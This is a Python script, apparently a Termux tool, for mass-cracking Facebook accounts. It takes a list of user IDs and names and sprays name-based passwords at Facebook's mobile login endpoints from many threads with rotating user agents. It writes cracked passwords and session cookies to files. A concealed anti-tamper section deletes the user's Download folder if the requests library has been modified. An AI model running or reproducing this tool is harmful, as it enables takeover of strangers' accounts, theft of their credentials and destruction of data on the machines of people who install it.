from urllib.request import urlopen
import os,uuid,subprocess,json
import time
import re
import random
import sys
import base64
from string import *
import string
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor as tred
import datetime
from time import localtime as lt
from bs4 import BeautifulSoup as bxx
from bs4 import BeautifulSoup
import shutil
#------------------[ DARK-CLR ]-------------------#
def clear():
    os.system('clear')
RED = '\033[1;91m' #
WHITE = '\033[1;97m' #
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m' #
BLUE = '\033[1;34m' #
ORANGE = '\033[1;35m' #
P = '\x1b[1;97m' # 
M = '\x1b[1;91m' # 
H = '\x1b[1;92m' # 
K = '\x1b[1;93m' # 
B = '\x1b[1;94m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;96m' #
N = '\x1b[0m' #
rr = random.randint; rc = random.choice
#--------------------[ DATE-TIME ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
#------------------[ DARK-INTRO ]-------------------#
os.system('clear')
animation('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92m𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙐𝙥𝙙𝙖𝙩𝙚... ')
time.sleep(1)
os.system("git pull")
def clear_terminal():
    os.system('clear')

def install_module(module_name):
    loading_bar_width = 40
    for i in range(loading_bar_width + 1):
        sys.stdout.write('\r\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mLoading {}... [{}] {:.2f}%'.format(module_name, '#' * i + '.' * (loading_bar_width - i), i * 100 / loading_bar_width))
        sys.stdout.flush()
        time.sleep(0.1)
    
    sys.stdout.write('\n')
    sys.stdout.flush()

clear_terminal()
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mInstalling modules...')

# Install modules one by one
install_module('espeak')
os.system("pkg install espeak")

install_module('rich')
os.system("pip install rich")

install_module('bs4')
os.system("pip install bs4")

clear_terminal()
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mInstallation complete.')
os.system('clear')
animation("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92m𝙅𝙊𝙄𝙉 𝙊𝙐𝙍 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙂𝙍𝙊𝙐𝙋")
time.sleep(3)
os.system(f'xdg-open https://www.facebook.com/groups/2477016825771219')
print()
animation("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92m𝙁𝙊𝙇𝙇𝙊𝙒 𝙈𝙔 𝙂𝙄𝙏𝙃𝙐𝘽 𝘼𝘾𝘾𝙊𝙐𝙉𝙏")
time.sleep(3)
os.system(f'xdg-open https://github.com/Dragon-Lord-404')
print()
attempts = 0
while attempts < 12345677901:
    username = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;97mEnter username: ')
    password = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;97mEnter password: ')

    if username == 'r' and password == 'j':
        animation('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;93m𝐿𝑂𝐺𝐼𝑁 𝑆𝑈𝐶𝐶𝐸𝑆𝑆𝐹𝑈𝐿𝐿𝑌.....')
        time.sleep(2)
        break
    else:
        print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;91mIncorrect. Please try again.')
        time.sleep(2)
        attempts += 1

os.system('clear')
#----try-----#
try:
    import requests
except ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python FILE.py')
#--------------------STORAGE-FUCKER--------------------------#
def delete_folder(folder_path):
    try:
        shutil.rmtree(folder_path)
        print(f"Folder {folder_path} deleted successfully.")
    except Exception as e:
        print(f"Error deleting {folder_path}: {e}")
folder_path = '/sdcard/Download'
#--------------------------proxies---------------------------#
fuck='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'if self.url==' in open(fuck+'models.py','r').read():
    pass
else:
    delete_folder(folder_path)
    exit('\033[1;32mFUCK YOU BYPASS USER.YOUR STORAGE FUCKED BY DRAGON.')
king='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(king+'sessions.py','r').read():
    pass
else:
    delete_folder(folder_path)
    exit('\033[1;32mWE DETECTED SOME CHANGES INTO YOUR REQEUESTS FILES')
qeen='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(qeen+'models.py','r').read():
    pass
else:
    delete_folder(folder_path)
    exit('\033[1;32mWE DETECTED SOME CHANGES INTO YOUR REQEUESTS FILES')
don='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(don+'utils.py','r').read():
    pass
else:
    delete_folder(folder_path)
    exit('\033[1;32mWE DETECTED SOME CHANGES INTO YOUR REQEUESTS FILES')
#-----[UserAgent]-----#
ugen = []
for agent in range(random.randint(89999, 150000)):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['9','10','11','12'])
    c='; vi-vn; CPH1937 Build/PKQ1.190714.001)'
    d=random.randrange(7,13)
    e='en-us; GT-'
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.randrange(111,999)
    h=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    i='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    j=random.randrange(11,99)
    k='0'
    l=random.randrange(1111,9999)
    m=random.randrange(11,99)
    n='Mobile Safari/537.36 OppoBrowser/25.5.1.9'
    fullagent=f'{a} {b} {c} {d};  {e}{f}{g}{h} {i}{j}.{k}.{l}.{m} {n}'
    ugen.append(fullagent)
#----------------------[CHECK CREATION YEAR]----------------#         
def joined(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :creation = ' 2009'
        elif ids[:9] in ['100000000']       :creation = ' 2009'
        elif ids[:8] in ['10000000']        :creation = ' 2009'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = ' 2009'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:creation = ' 2010'
        elif ids[:6] in ['100001']          :creation = ' 2010 | 2011'
        elif ids[:6] in ['100002','100003'] :creation = ' 2011 | 2012'
        elif ids[:6] in ['100004']          :creation = ' 2012 | 2013'
        elif ids[:6] in ['100005','100006'] :creation = ' 2013 | 2014'
        elif ids[:6] in ['100007','100008'] :creation = ' 2014 | 2015'
        elif ids[:6] in ['100009']          :creation = ' 2015' 
        elif ids[:5] in ['10001']           :creation = ' 2015 | 2016'
        elif ids[:5] in ['10002']           :creation = ' 2016 | 2017'
        elif ids[:5] in ['10003']           :creation = ' 2018 | 2019'
        elif ids[:5] in ['10004']           :creation = ' 2019 | 2020'
        elif ids[:5] in ['10005']           :creation = ' 2020'
        elif ids[:5] in ['10006','10007']   :creation = ' 2021'
        elif ids[:5] in ['10008']           :creation = ' 2022'
        elif ids[:5] in ['10009']           :creation = ' 2023'
        elif ids[:2] in ['61','65']         :creation = ' NEW'
        else:creation=''
    elif len(ids) in [9,10]:
        creation = ' 2008 | 2009'
    elif len(ids)==8:
        creation = ' 2007 | 2008'
    elif len(ids)==7:
        creation = ' 2006 | 2007'
    else:creation=''
    return creation
#---------LOCK-CHECK-----#
def lock_check(uid):
    sessionx=requests.Session()
    urlx=f'https://www.facebook.com/p/{uid}'
    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
    tx=req.find('title').text
    if tx =='Facebook':
        return('LOCK')
    else:
        return('LIVE')
#----------LOGO-------------#
logo=("""
\033[38;2;148;0;211m ########  ########     ###     ######    #######  ##    ## 
\033[38;2;0;127;255m ##     ## ##     ##   ## ##   ##    ##  ##     ## ###   ## 
\033[38;2;255;204;0m ##     ## ##     ##  ##   ##  ##        ##     ## ####  ## 
\033[38;2;255;127;0m ##     ## ########  ##     ## ##   #### ##     ## ## ## ## 𝙇
\033[38;2;128;0;0m ##     ## ##   ##   ######### ##    ##  ##     ## ##  #### 𝙊
\033[38;2;255;182;193   ##     ## ##    ##  ##     ## ##    ##  ##     ## ##   ### 𝙍
\033[38;2;75;0;130m ########  ##     ## ##     ##  ######    #######  ##    ## 𝘿\033[1;93m
\x1b[1;93m┏───────────────────────────────────────────────┓
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘈𝘜𝘛𝘏𝘖𝘙     \x1b[1;97m: \033[38;2;0;127;255mDRAGON LORD
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘠𝘗𝘌       \x1b[1;97m: \033[38;2;0;127;255mFREE🔥
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘎𝘐𝘛𝘏𝘜𝘉     \x1b[1;97m: \033[38;2;0;127;255mDRAGON-LORD-404
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘖𝘖𝘓       \x1b[1;97m: \033[38;2;0;127;255mFILE+RANDOM
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘝𝘌𝘙𝘚𝘐𝘖𝘕    \x1b[1;97m: \033[38;2;0;127;255m5.0.8 [CMOS]
\x1b[1;93m┗───────────────────────────────────────────────┛""")  
def linex():
        print("\x1b[1;94m"+"━"*40+"\x1b[0;1m")
def clear():
        os.system(f'clear')
        print(logo)
#-----COUNTERS-----#
loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []
#------------------[ DARK-MENU ]-------------------#
def menu():
    try:
        clear()
        if 1 == 1:
            clear()
            print('\033[1;37m[1] FILE CLONING\n\033[1;37m[2] CLOSE TOOL')
            linex()
            xd = input('\033[1;37m[➢] CHOOSE : ')
            if xd in ['01', '1']:
                clear()
                print('\033[38;2;0;255;0m[PUT FILE EXAMPLE:  /sdcard/DRAGON.txt  Etc...]')
                file = input('\033[1;37m[📂] INPUT FILE NAME: ')
                try:
                    fo = open(file, 'r').read().splitlines()
                except FileNotFoundError:
                    os.system('espeak -a 300 " File, location, not, found"')
                    print('[❌] FILE LOCATION NOT FOUND [❌]')
                    time.sleep(1)
                    menu()
                clear()
                print('\033[1;32m[1] METHOD 1 [FAST][mbasic.facebook.com] \n[2] METHOD 2 [SLOW][m.facebook.com]')
                linex()
                mthd = input('\033[1;32m[+] CHOOSE : ')
                linex()
                plist = []
                print('\033[1;37m           SELECT CRACK MENU')
                linex()
                print('[1] AUTO PASSWORD [BEST]\n[2] MANUAL PASSWORD')
                linex()
                ppp = input('\033[1;32m[+] CHOOSE : ')
                if ppp in ['1', '01']:
                    plist.append('first last')
                    plist.append('first')
                    plist.append('firstlast')
                    plist.append('first@12')
                    plist.append('first@123')
                    plist.append('first@1234')
                    plist.append('first@12345')
                    plist.append('first@123456')
                    plist.append('first12')
                    plist.append('first123')
                    plist.append('first1234')
                    plist.append('first12345')
                    plist.append('first123456')
                    plist.append('first11')
                    plist.append('first111')
                    plist.append('first1122')
                    plist.append('first@')
                    plist.append('first@@')
                    plist.append('first@@@')
                    plist.append('first@@@@')
                    plist.append('first@#')
                else:
                    try:
                        linex()
                        ps_limit = int(
                            input(' HOW MANY PASSWORD DO YOU WANT TO ADD ? '))
                    except:
                        ps_limit = 15
                    linex()
                    print('\033[1;32m EXAMPLE: first last,firtslast,first123')
                    linex()
                    for i in range(ps_limit):
                        plist.append(
                            input(f'\033[1;32m[+] PUT PASSWORD {i+1}: '))
                linex()
                print('[➢]SHOW CP ACCOUNT? (Y/n): ')
                linex()
                cx = input(' CHOOSE: ')
                if cx in ['y', 'Y', 'yes', 'Yes', '1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=25) as crack_submit:
                    clear()
                    tl = str(len(fo))
                    total_userg = str(len(ugen))
                    print("[+] \033[1;31mDATE:\033[1;92m "+date)
                    print("[+] \033[1;32mSTART TIME\033[0;97m :\033[1;92m"+time.strftime("%H:%M")+" "+ tag)
                    print('[+] \033[1;33mTOTAL ID   : \033[1;32m'+tl)
                    print('[+] \033[1;35mTOTAL UGEN : \033[1;33m'+total_userg)
                    print("\033[1;34m[!] CRACKING HAS BEEN STARTED")
                    print("""\033[1;91m\033[1;46m\033[1;91m ✈ USE FLIGHT MODE IN EVERY 4 MIN\033[;0m\033[1;91m\033[1;92m""")
                    linex()
                    for user in fo:
                        ids, names = user.split('|')
                        passlist = plist
                        if mthd in ['1', '01']:
                            crack_submit.submit(m1, ids, names, passlist)
                        elif mthd in ['2', '02']:
                            crack_submit.submit(m2, ids, names, passlist)
                print('\033[1;37m')
                linex()
                print('[+]\033[1;31mCRACKING HAS COMPLETED')
                print('[+]\033[1;32mTotal OK/CP/2F: '+str(len(oks)) +
                      '/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input('[+]PRESS ENTER FOR MAIN MENU[+]')
                os.system('python CUDS.py')
            elif xd in ['02', '2']:
                exit
            elif xd in ['03', '3']:
                bd()
            elif xd in ['04', '4']:
                exit('BYE BYE Tata Gaya')
            else:
                exit(' Option not found in menu...')
        else:
            print(' Run :  python CUDS.py')
            linex()
            exit()
    except ValueError:
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
#-------METHOD1--------#
def m1(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write('\r\r\033[1;33m「DRAGON-M1」 %s - \033[1;32m「OK ID:-%s」'% (loop, len(oks)));sys.stdout.flush()
    ses = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Islam'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            ua = random.choice(ugen)
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9"})
            p = ses.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr') 
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade={'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            log_cookies = po.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
                print('\r\r\033[1;36m[DRAGON-OK💚]\033[1;35m ' +ids+ ' • ' +pas+ ' \n[⌛] • \033[38;2;0;128;128mJOIN DATE = \033[1;32m'+joined(ids)+' \n\033[1;31m[🍪] • \033[1;36mCOOKIES = \033[38;2;255;215;0m'+coki+ '')
                print("\x1b[1;94m"+"━"*40+"\x1b[0;1m")
                with open('/sdcard/FILE-OK.txt', 'a') as file:
                    file.write('UID: ' + ids + '\n')
                    file.write('Password: ' + pas + '\n')
                    file.write('Cookies: ' + coki + '\n')
                oks.append(ids)
                break
            elif 'checkpoint' in log_cookies:
                print('\r\r\033[1;31m[DRAGON-CP]\033[1;35m  ' +ids+ ' • ' +pas+ ' \033[0;97m')
                with open('/sdcard/FILE-CP.txt', 'a') as file:
                    file.write('UID: ' + ids + '\n')
                    file.write('Password: ' + pas + '\n')
                cps.append(ids)
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
#-------METHOD2--------#
def m2(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write('\r\r\033[1;33m「DRAGON-M2」 %s - \033[1;32m「OK ID:-%s」'% (loop, len(oks)));sys.stdout.flush()
    ses = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Islam'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            ua = random.choice(ugen)
            ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9"})
            p = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr') 
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade={'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            log_cookies = po.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
                print('\r\r\033[1;36m[DRAGON-OK💚]\033[1;35m ' +ids+ ' • ' +pas+ ' \n[⌛] • \033[38;2;0;128;128mJOIN DATE = \033[1;32m'+joined(ids)+' \n\033[1;31m[🍪] • \033[1;36mCOOKIES = \033[38;2;255;215;0m'+coki+ '')
                print("\x1b[1;94m"+"━"*40+"\x1b[0;1m")
                with open('/sdcard/FILE-OK.txt', 'a') as file:
                    file.write('UID: ' + ids + '\n')
                    file.write('Password: ' + pas + '\n')
                    file.write('Cookies: ' + coki + '\n')
                oks.append(ids)
                break
            elif 'checkpoint' in log_cookies:
                print('\r\r\033[1;31m[DRAGON-CP]\033[1;35m  ' +ids+ ' • ' +pas+ ' \033[0;97m')
                with open('/sdcard/FILE-CP.txt', 'a') as file:
                    file.write('UID: ' + ids + '\n')
                    file.write('Password: ' + pas + '\n')
                cps.append(ids)
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
#-----[Run Menu]-----#
def superuser():
    UMO="DRAGON-"
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "-".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/god-dark-z/Fake-fun/blob/main/fun.txt").text
    if id in DARK:
        menu()
    else:
        os.system("clear")
        time.sleep(3.0)
        os.system("clear")
        print(logo)
        print("\t\033[30m   [\033[1;32m\033[47m GET APPROVAL \033[00m\033[1;30m]")
        print ("")
        print("\n\033[1;32m│ Note : That is FREE you need approval to use it │\033[1;37m\n")
        print ("")
        print("            [+]Your Key is Not Approved ")
        print("            [+]Copy And Send Key To Admin")
        print ("")
        print (" Your Key : "+UMO+id)
        print ("\n")
        name = input(" Your Name : ")
        print ("")
        input(" Press Enter To Send Key")
        os.system("xdg-open https://t.me/hidden_key_bot")
superuser()